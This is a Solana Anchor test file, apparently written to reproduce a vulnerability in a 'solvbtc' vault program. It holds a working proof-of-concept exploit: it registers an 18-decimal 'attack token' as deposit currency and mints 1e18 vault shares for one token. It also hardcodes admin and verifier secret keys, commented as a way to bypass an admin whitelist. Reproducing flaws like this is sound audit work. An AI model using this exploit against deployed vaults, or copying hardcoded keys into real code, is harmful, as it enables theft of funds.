import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Solvbtc } from "../target/types/solvbtc";
import { Keypair, LAMPORTS_PER_SOL, SystemProgram, Transaction, ComputeBudgetProgram, sendAndConfirmTransaction } from "@solana/web3.js";
import { deriveVaultAddress, ONE_BITCOIN } from "../sdk/solvbtc";
import { BN } from "bn.js";
import { createAssociatedTokenAccountIdempotentInstruction, createInitializeMint2Instruction, createInitializeMultisigInstruction, getAssociatedTokenAddressSync, getMinimumBalanceForRentExemptMint, getMinimumBalanceForRentExemptMultisig, MINT_SIZE, MULTISIG_SIZE, TOKEN_PROGRAM_ID, mintTo } from "@solana/spl-token";
import { ASSOCIATED_PROGRAM_ID } from "@coral-xyz/anchor/dist/cjs/utils/token";

describe("repro_issue", () => {
  anchor.setProvider(anchor.AnchorProvider.env());
  const provider = anchor.getProvider();
  const connection = provider.connection;
  const program = anchor.workspace.solvbtc as Program<Solvbtc>;

  // Use the admin keypair from sdk/solvbtc.ts or test file to bypass ADMIN_WHITELIST
  const authorityKeypair = Keypair.fromSecretKey(new Uint8Array([
    50, 113, 208, 51, 176, 21, 27, 129, 26, 20, 53,
    124, 179, 130, 206, 138, 228, 170, 199, 24, 193, 60,
    253, 134, 123, 125, 163, 189, 9, 185, 55, 19, 33,
    189, 5, 146, 32, 116, 24, 195, 49, 105, 110, 174,
    167, 205, 203, 23, 17, 29, 199, 83, 33, 241, 105,
    206, 179, 236, 186, 72, 144, 232, 119, 227
  ]));
  const authority = authorityKeypair.publicKey;

  const adminKeypair = Keypair.generate();
  const admin = adminKeypair.publicKey;
  const userKeypair = Keypair.generate();
  const user = userKeypair.publicKey;
  const feeReceiverKeypair = Keypair.generate();
  const feeReceiver = feeReceiverKeypair.publicKey;
  const treasurerKeypair = Keypair.generate();
  const treasurer = treasurerKeypair.publicKey;
  const oracleManagerKeypair = Keypair.generate();
  const oracleManager = oracleManagerKeypair.publicKey;

  const mintAKeypair = Keypair.generate();
  const mintA = mintAKeypair.publicKey; // Target Token (8 decimals)
  const mintBKeypair = Keypair.generate();
  const mintB = mintBKeypair.publicKey; // Attack Token (18 decimals)

  const vaultA = deriveVaultAddress(mintA);
  const multisigAKeypair = Keypair.generate();
  const multisigA = multisigAKeypair.publicKey;

  let verifierKeypair = Buffer.from("c2fffbf8e5cec943afb99e8194a5819c64c9df75b4ed03b2a111e8ccdcf55689", "hex")
  let verifier = Array.from(Buffer.from("04870425a176846998495536412e6985a97576566087b32607e15865a71147055048d88e83344d5c41498c4800631d86d5256e29783857317208d98d254b077a32", "hex").subarray(1));

  const userAtaA = getAssociatedTokenAddressSync(mintA, user);
  const userAtaB = getAssociatedTokenAddressSync(mintB, user);
  const treasurerAtaB = getAssociatedTokenAddressSync(mintB, treasurer); // Deposits go here

  it("Setup and Exploit", async () => {
    // 1. Airdrop
    await provider.sendAndConfirm(new Transaction().add(
      SystemProgram.transfer({ fromPubkey: provider.publicKey, toPubkey: authority, lamports: 10 * LAMPORTS_PER_SOL }),
      SystemProgram.transfer({ fromPubkey: provider.publicKey, toPubkey: admin, lamports: 10 * LAMPORTS_PER_SOL }),
      SystemProgram.transfer({ fromPubkey: provider.publicKey, toPubkey: user, lamports: 10 * LAMPORTS_PER_SOL }),
      SystemProgram.transfer({ fromPubkey: provider.publicKey, toPubkey: treasurer, lamports: 10 * LAMPORTS_PER_SOL }), // Treasurer needs rent if creating ATAs?
    ), []);

    // 2. Create Mints
    // Mint A: 8 decimals (Target)
    // Mint B: 18 decimals (Deposit)
    const lamportsMint = await getMinimumBalanceForRentExemptMint(connection);
    const lamportsMultisig = await getMinimumBalanceForRentExemptMultisig(connection);

    await provider.sendAndConfirm(new Transaction().add(
        SystemProgram.createAccount({ fromPubkey: provider.publicKey, newAccountPubkey: multisigA, space: MULTISIG_SIZE, lamports: lamportsMultisig, programId: TOKEN_PROGRAM_ID }),
        createInitializeMultisigInstruction(multisigA, [vaultA], 1, TOKEN_PROGRAM_ID), // vaultA is signer

        SystemProgram.createAccount({ fromPubkey: provider.publicKey, newAccountPubkey: mintA, space: MINT_SIZE, lamports: lamportsMint, programId: TOKEN_PROGRAM_ID }),
        createInitializeMint2Instruction(mintA, 8, multisigA, null, TOKEN_PROGRAM_ID),

        SystemProgram.createAccount({ fromPubkey: provider.publicKey, newAccountPubkey: mintB, space: MINT_SIZE, lamports: lamportsMint, programId: TOKEN_PROGRAM_ID }),
        createInitializeMint2Instruction(mintB, 18, authority, null, TOKEN_PROGRAM_ID), // authority is mint authority for MintB
    ), [multisigAKeypair, mintAKeypair, mintBKeypair]);

    // 3. Initialize Vault for MintA
    // Wait, authority must sign to initialize.
    await program.methods.vaultInitialize(
        admin, feeReceiver, treasurer, verifier, oracleManager, ONE_BITCOIN, 0
    ).accountsStrict({
        payer: authority,
        authority: authority, // Must be in whitelist
        mint: mintA,
        vault: vaultA,
        systemProgram: SystemProgram.programId
    }).signers([authorityKeypair]).rpc();

    // 4. Add MintB as currency
    // Use authority (admin set in initialize was 'admin' pubkey).
    await program.methods.vaultAddCurrency(
        mintB, 0 // 0 fee
    ).accountsStrict({
        payer: authority, // Payer for tx fees
        admin: admin, // Vault admin
        vault: vaultA,
        mint: mintA, // Vault mint (used to derive vault address in constraint, but handled by anchor usually)
    }).signers([authorityKeypair, adminKeypair]).rpc();

    // 5. Mint 1 unit of MintB (1e18) to User
    // 1e18 raw amount = 1 token (18 decimals).
    const amountMintB = new BN("1000000000000000000"); // 1e18

    // Create ATA for User
    await provider.sendAndConfirm(new Transaction().add(
        createAssociatedTokenAccountIdempotentInstruction(provider.publicKey, userAtaB, user, mintB),
        createAssociatedTokenAccountIdempotentInstruction(provider.publicKey, userAtaA, user, mintA), // To receive shares
        createAssociatedTokenAccountIdempotentInstruction(provider.publicKey, treasurerAtaB, treasurer, mintB), // To receive deposit
    ), []);

    // Mint to User
    // payer: authorityKeypair (Signer)
    // mint: mintB
    // destination: userAtaB
    // authority: authorityKeypair (Signer)
    // amount: 1e18
    await mintTo(connection, authorityKeypair, mintB, userAtaB, authorityKeypair, BigInt("1000000000000000000"));

    // 6. User Deposits 1e18 MintB
    // We expect 1e18 shares because NAV=1e8 (1 BTC).
    // share = deposit * 1e8 / nav = 1e18 * 1e8 / 1e8 = 1e18.

    await program.methods.vaultDeposit(
        amountMintB,
        new BN(0) // min out
    ).preInstructions([
        // Ensure treasurer ATA exists (already created)
    ]).accountsStrict({
        user: user,
        userTokenTa: userAtaB,
        userTargetTa: userAtaA,
        treasurerTokenTa: treasurerAtaB,
        multisig: multisigA, // Passed as multisig account to vault (which is authority)
        mintToken: mintB,
        mintTarget: mintA,
        vault: vaultA,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_PROGRAM_ID
    }).signers([userKeypair]).rpc();

    // 7. Check User Balance of MintA (Shares)
    const userAtaAInfo = await connection.getTokenAccountBalance(userAtaA);
    console.log("User MintA Balance:", userAtaAInfo.value.amount);

    if (userAtaAInfo.value.amount !== "1000000000000000000") {
        throw new Error(`Expected 1e18 shares, got ${userAtaAInfo.value.amount}`);
    }

    console.log("Vulnerability Confirmed: User received 1e18 shares (10^10 units of target value) for depositing 1 unit of attack token.");
  });
});
